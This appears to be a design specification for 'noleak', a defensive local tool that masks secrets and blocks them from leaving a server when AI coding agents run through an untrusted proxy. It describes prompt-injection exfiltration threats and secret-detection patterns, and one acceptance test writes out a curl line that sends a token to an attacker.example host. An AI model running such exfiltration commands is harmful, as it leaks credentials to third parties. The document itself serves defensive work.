# `noleak` — Architecture Specification

Build-phase handoff. Everything below is decided; what's outside this doc is intentionally out-of-scope and should not be added without a planning round.

---

## 1. Purpose

A local, defense-in-depth tool that lets the user run agentic AI CLIs (Claude Code, Codex, Cursor, OpenClaw, etc.) through a fully untrusted upstream proxy without any class-1–4 secret leaving the local VPS in plaintext, even when the user pastes raw, even when the agent reads a sensitive file, even when prompt injection redirects an outbound HTTP call.

## 2. Threat model

**Adversary.** The upstream proxy is assumed to log all request/response bodies indefinitely, replay, sell, train on, or share them. No proof of trustworthiness exists or is sought.

**Asset hierarchy** (descending):

1. Crypto exchange API keys/secrets, wallet seeds, signing keys
2. Telegram bot tokens, Telegram user API hash + ID
3. Cloud infra creds (Cloudflare, R2, GCP)
4. Account passwords (MEGA, backup encryption)
5. LLM provider keys
6. Account/region IDs

**Trust zones.** Trusted: same-UID processes on the VPS, Unix sockets/files at 0600, OS keyring. Untrusted: anything reaching beyond `127.0.0.1`, including direct Anthropic if added.

**Threat events covered:**

| # | Event | Layer |
|---|---|---|
| T1 | Human pastes a secret into the agent prompt | L1 |
| T2 | Agent reads file → secret in context → next outbound | L3 |
| T3 | Secret enters context via any other path → outbound | L2 |
| T4 | Agent issues outbound call to a destination of attacker's choosing, embedding a real secret | L4 |
| T5 | CLI snapshots `env` → recurring on-disk leak | L5 |
| T6 | Transcript replay re-sends historical secret | L2 + Sweep |

**Out of scope (do not implement):** recovery of past leakage; defending against same-UID attackers (root → root is game over); side-channel hiding (size, timing, destination of *that you used Anthropic*); web UI; multi-user.

**Acceptable cost:** ≤ 300 ms per outbound request, ≤ 30 ms per tool result, occasional false-positive masking that the user un-redacts via `Esc` or explicit raw-pass.

## 3. Components

```
┌────────────┐    paste    ┌──────────────────┐
│  terminal  │────────────▶│ L1  noleak (PTY)     │── stdin to CLI
└────────────┘             └──────┬───────────────┘
                                  │ scan/register
       agent stdout/stderr        ▼
┌──────────────────────┐    ┌──────────────────────┐
│  agent CLI (claude/  │───▶│  noleakd  (daemon)   │
│   codex/cursor/…)    │    │  ├─ Aho-Corasick     │
└─────┬───────┬────────┘    │  ├─ pattern engine   │
      │       │             │  ├─ vault.db (SQL-   │
   tool call  │ outbound    │  │   Cipher 0600)    │
      │       ▼             │  ├─ master.key       │
      │  ┌──────────────┐   │  │   keyring/pass    │
      │  │ L2 noleak-   │──▶│  └─ UDS @ 0600       │
      │  │   proxy      │   │                      │
      │  │127.0.0.1:9999│──▶│  forwards to         │
      │  └──────────────┘   │  untrusted upstream  │
      ▼                     └──────────────────────┘
┌──────────────────────┐
│ L3 PostToolUse hook  │── scrub tool result before model context
│ L4 PreToolUse hook   │── parse dest, intersect bindings, sub or pass-through
└──────────────────────┘
                      ┌──────────────────────┐
                      │ L5 noleak-watch      │── inotify on snapshot dirs
                      │   (separate process) │
                      └──────────────────────┘
```

## 4. Daemon (`noleakd`) — the only stateful component

**Storage layout** — `~/.noleak/`

- `master.key.sealed` (0600) — AES-256 master key, sealed against libsecret if available, else encrypted with PBKDF2(passphrase).
- `vault.db` (0600) — SQLCipher with three tables:
  - `secrets(id, placeholder, value_blob, type, source, registered_at, rotation_due, status)`
  - `bindings(secret_id, host_pattern)`
  - `audit(ts, event, layer, placeholder_id)` — placeholders only, never values
- `sock` (0600) — Unix domain socket, cleaned up on exit.
- `allowlist.db` — per-host substring allowlist for rejected detections (avoids re-triggering on same false positive).

**Master key sourcing**

1. Try libsecret via `secret-tool`. On success, decrypt `master.key.sealed`.
2. On absence/failure, daemon refuses to serve until `noleak unlock` provides the passphrase. Cached in process memory only.

**IPC**

- Unix domain socket; `SO_PEERCRED` UID equality check on accept.
- Length-prefixed JSON, request/response per connection.
- Operations: `scan`, `resolve`, `register`, `bind`/`unbind`, `list`, `rotate`, `delete`, `health`.

**Hot path scan**

1. Aho-Corasick over the value column → exact known matches (sub-ms on 200 KB).
2. For unmatched residue, gitleaks pattern set + entropy (≥ 4.0 bits/char on strings ≥ 20 chars) + context heuristics (KEY=VALUE, JSON value following `*key*|*token*|*secret*|*password*`, `declare -x` lines).
3. Hits go through auto-register (see §6).

**Fail-closed semantics.** If the daemon is down or unlocked-pending, every layer refuses to release data. No fallthrough.

**Concurrency.** Single async event loop. SQLite WAL mode. One writer at a time; readers concurrent.

## 5. Layers

**L1 — PTY wrapper (`noleak <cmd>`)**

- Allocates a PTY, forks the inner CLI, watches input for bracketed-paste sequences (`\e[200~ … \e[201~`) and Enter on typed lines.
- For each candidate buffer: `scan` via daemon → if hits, replace inline with placeholders, print 1-line banner above the prompt:
  ```
  [noleak] redacted 1 paste — telegram_bot_token → @TOKEN_a3f@   [esc=undo within 3s]
  ```
- Pre-Enter hold window: 3 s. Esc within that window restores the raw paste and marks the matched substring(s) as session-allowlisted.
- Esc-to-undo applies to *that paste only*. The next paste of the same value triggers detection again.

**L2 — local API proxy**

- Listens on `127.0.0.1:9999`. The user sets `ANTHROPIC_BASE_URL=http://127.0.0.1:9999/v1/`.
- For every request: `scan(body)` → substitute → forward to the configured upstream. For every response: `scan(body)` → substitute → return to client.
- Mask-and-forward on detection misses (already decided). Notification surfaces async.

**L3 — PostToolUse hook**

- Installed via `warden install-hooks` for each agent CLI.
- Receives tool result, runs `scan`, returns redacted result to the model.
- Path-based pre-filter: results sourced from blocklisted paths (see §7) get heavier scrubbing applied unconditionally.

**L4 — PreToolUse hook**

- Inspects the tool call about to execute. If it contains a placeholder:
  - Extract destination host from the call (URL parser for curl/wget/http-libs/python-requests templates).
  - `resolve(placeholder, host)` against daemon. Returns the real value only if `host` matches a stored binding pattern; otherwise returns null.
  - Null → call proceeds with the literal placeholder string. Notify user.
  - Match → daemon hands the real value to the hook for one-shot in-place substitution. The substituted command is exec'd. The shell history line stays as the placeholder version.
- Bindings inferred at registration time from env-var name: `MEXC_*` → `api.mexc.com`, `TELEGRAM_BOT_TOKEN` → `api.telegram.org`, `R2_*` → `*.r2.cloudflarestorage.com`, `CF_*` → `api.cloudflare.com`, etc. Editable via `noleak bind`.
- Optional secondary blocklist (Cloudflare Radar / URLhaus): hard-refuse the call regardless of bindings if the destination matches.

**L5 — `noleak-watch`**

- Separate small daemon, inotify-driven.
- `IN_CREATE | IN_CLOSE_WRITE` on a hard-coded list:
  - `~/.codex/shell_snapshots/`, `~/.codex/.tmp/`
  - `~/.bash_history`, `~/.zsh_history`
  - `~/.claude/projects/`, `~/.claude/shell-snapshots/`
  - `~/.openclaw/logs/`, `~/.cursor/logs/`
  - User-extensible via `~/.noleak/watch.yaml`.
- Per-path action: `purge` (delete on detection) or `redact` (scrub via daemon). Shell-snapshot dirs default to `purge`.

## 6. Detection on miss — auto-register flow

1. Daemon detects unknown secret. Generates placeholder `@TOKEN_<6 hex>@` (deterministic from value: first 6 hex of `BLAKE2s-128(value || master_secret)`). Same secret → same placeholder forever.
2. Inserts `secrets(status='pending_review')` and infers `bindings` from context.
3. Substitutes in the request/response that triggered detection. Layer-appropriate notification:
   - Inline banner if Layer 1.
   - `[noleak] caught new secret — @TOKEN_a3f@ (telegram_bot_token), pending review (12 total)` printed above next shell prompt.
4. User runs `noleak review` at convenience.

## 7. Curation UX — `noleak review`

Pager-style, one entry at a time. Per-entry display masked by default, `v` reveals.

States and actions:

| State | Effect |
|---|---|
| `accepted` | Substitutes normally, silent. |
| `rotation-needed` | Substitutes normally + emits `[noleak] using rotation-needed credential` warning per use. Listed in `noleak status`. |
| `rejected` | Removed from vault, added to per-host allowlist so same string in same context doesn't re-trigger. |
| `delete-from-disk` | Vault entry removed; user prompted to `warden sweep --redact` or `--clean` the source file(s). |

`noleak review --bulk` groups by source dir + detected type, accept/reject all in one keystroke. Designed for the bootstrap-scan flood.

Pending-review counter injected into `PROMPT_COMMAND` at install. Quiet at zero.

## 8. Bootstrap — first-run harvest

Scan scope (decided: scope-3 because user is root):

- `$HOME/.codex`, `$HOME/.claude`, `$HOME/.openclaw`, `$HOME/.cursor`, `$HOME/.gemini`, `$HOME/.config/`, `$HOME/.npmrc`, `$HOME/.docker/`
- `$HOME/.bash_history`, `$HOME/.zsh_history`
- `$HOME/.env`, `$HOME/.env.*`, `**/.env` in known workspace dirs
- `/etc`, `/srv`, `/var/log`

Excluded: `node_modules`, `.cache`, build outputs (`dist`, `build`, `target`), `.git/objects`.

Output: every detection lands in `secrets(status='pending_review')`. User is dropped into `noleak review --bulk` immediately after install.

## 9. Install flow

```
noleak install
  ├─ check libsecret/keyring; choose master-key mode
  ├─ generate master key, seal it
  ├─ initialize ~/.noleak/{vault.db, allowlist.db, sock}
  ├─ install systemd user units: noleakd, noleak-watch
  ├─ install PROMPT_COMMAND snippet in ~/.bashrc
  ├─ run bootstrap harvest
  ├─ install agent hooks (delegates to existing `warden install-hooks --agent all`)
  ├─ write ~/.noleak/config.yaml (proxy upstream, watch list, blocklist sources)
  └─ start `noleak review --bulk`
```

User then either replaces `claude` in their workflow with `noleak claude`, or sets up an alias.

## 10. Existing exposure — handling the 165 hits

Operational, not part of the build, but lives in the spec because the build needs to expose the helpers:

1. **`noleak rotate-list`** — outputs the rotation worksheet: every credential in the vault with `status='rotation-needed'` plus everything found in `/var/log` or in past-session `~/.claude/projects/*.jsonl`. CSV: `placeholder, type, source, provider, rotation_url`.
2. User rotates at each provider in priority order (crypto → Telegram → Cloud → accounts → LLM).
3. **`noleak rotate <placeholder> <new-value>`** — atomic vault swap. The new value also gets bound; old value moves to `secrets_archived` retained for forensic-grep only.
4. **`warden sweep --clean ~/.codex/shell_snapshots/`** — purges the stale snapshot. From this point forward, L5 (`noleak-watch`) keeps it clean automatically.
5. The proxy token in `~/.claude/settings.json` is *not* a vault candidate (it's loaded by the CLI before any hook fires). Separate hardening: `chmod 600` (done), and ideally a wrapper that loads it from libsecret at launch time.

## 11. Open uncertainties (call out before build)

Honest list of things we estimated but didn't validate:

- **Detector latency on 200 KB request bodies** — estimated ≤ 50 ms with Aho-Corasick + selective gitleaks. Needs a real benchmark against actual conversation sizes. If above budget, hot path drops to AC-only and pattern engine moves to a background re-scan.
- **PreToolUse URL extraction limits** — robust for direct shell commands like curl/wget/python-requests/node-fetch. However, if an agent executes indirect scripts (e.g. writing a script containing placeholders and executing `python3 leak.py`), the command string lacks the destination URL. In such cases, PreToolUse fails closed, leaving placeholders unsubstituted, causing the script to fail.
- **Asynchronous Watcher Race Conditions** — The file watcher runs asynchronously via `fsnotify`. If an agent writes a secret to a file and reads it back within milliseconds, a brief window exists where the file remains raw on disk. While Layer 2 (HTTP Proxy) protects transmission, the local file is briefly exposed.
- **Bracketed-paste support** — universal in modern terminals; acts strictly as a paste protector. Character-by-character typed secrets bypass Layer 1 (PTY wrapper) but are caught at the Layer 2 transport proxy.
- **Upstream API surface stability** — L2 needs to stay transparent against the upstream's response format. If upstream changes shape, L2 breaks until updated. Mitigation: pure-passthrough on streaming, JSON-aware only on bodies it can parse cleanly.

## 12. What we explicitly did NOT design

To preserve scope discipline:

- No web dashboard. `noleak status` is CLI.
- No remote daemon, no multi-host vault sync. Single VPS only.
- No automated rotation against provider APIs. The rotation worksheet is human-driven.
- No mTLS or multi-user IPC auth. UDS + UID equality is the entire trust model.
- No machine-learning detector. Pattern + entropy + context only. LLM-classifier hook reserved as a future extension if false-negative analysis demands it.

## 13. Build order (suggested)

1. Daemon skeleton + vault + IPC + Aho-Corasick.
2. CLI: `init`, `add`, `list`, `bind`, `review`.
3. Detector module (gitleaks rules + entropy + context).
4. Layer 2 proxy (highest-value layer; covers T2, T3, T6 by itself).
5. Layer 1 PTY wrapper.
6. Layer 4 PreToolUse hook (binding-aware substitution).
7. Layer 3 PostToolUse hook.
8. Layer 5 inotify watcher.
9. Bootstrap harvester + curation flow.
10. Rotation tooling.

Stages 1–4 deliver a working system that already covers most of the threat model. Stages 5–10 progressively close the corners.

## 14. Acceptance tests

Before declaring the build done, the system must pass:

1. Paste a crafted Telegram bot token into `noleak claude` → token never appears in the upstream request body (verified by intercepting the proxy upstream).
2. Have the agent `cat ~/.codex/shell_snapshots/...sh` → tool result delivered to model contains zero plaintext secrets.
3. Have the agent emit `curl -d "$TOKEN_a3f@" https://attacker.example` (placeholder substitution test) → outbound HTTP request goes literally with `@TOKEN_a3f@`, no real value.
4. Drop a fresh fake secret into `~/.codex/shell_snapshots/` → `noleak-watch` redacts/purges within 1 second.

Any failure means the spec is wrong, not the build.

## 15. Decisions log

For traceability — every choice the planning session made, anchored to the gate that made it:

| Decision | Source |
|---|---|
| Latency budget: prefer safety, accept up to ~300 ms | Human gate after Step 1 (idea.md) |
| Detection on Layer 1 paste: default-redact, Esc to undo within 3 s | Question batch 1 |
| Layer 2 outbound: mask-and-forward (never raw, never block) | Question batch 1 |
| Layer 3 file reads: read-but-redact in result | Question batch 0 |
| Layer 4 destination gate: per-credential bindings, not network reputation | Refutation of "Cloudflare allowlist + probe" |
| No manual `@@KEY:value@@` registration: detection is autonomous, paste-time wrapper redacts | Human pushback against Cloak's manual UX |
| Bootstrap scope: $HOME + /etc + /srv + /var/log because user is root | Question batch 2 |
| Master-key storage: keyring with passphrase fallback | Question batch 3 |
| Detection on miss: auto-register + async notify + supervised cleanup | Question batch 3 |
| Codex env-snapshot leak: env-vars → keyring + inotify watcher + path blocklist | T5 design |
| Transcript replay (T6): solved by Layer 2 transparently; sweep only for on-disk hygiene | T6 design |
